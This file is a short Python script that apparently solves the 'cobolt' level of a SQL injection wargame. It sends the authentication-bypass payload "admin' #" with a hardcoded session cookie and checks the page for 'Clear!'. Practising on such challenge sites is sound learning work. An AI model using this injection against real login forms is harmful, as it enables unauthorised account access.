# coding: utf-8

'''
    cobolt
    1．構造的に対応する必要ないところは回避する(md5)
'''
import requests
import re

if __name__ == "__main__":
    cookies = {'PHPSESSID': '1n2m871r2tvs2q678csnl0o3u0'}
    url = 'https://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php'
    params = {'id': "admin' #"}
    r = requests.get(url=url, params=params, cookies=cookies)
    responseStr = r.content.decode('utf-8')
    print(responseStr)

    clearPattern = re.compile(r'Clear\!')
    if clearPattern.search(responseStr):
        print('yes')
    else:
        print('no')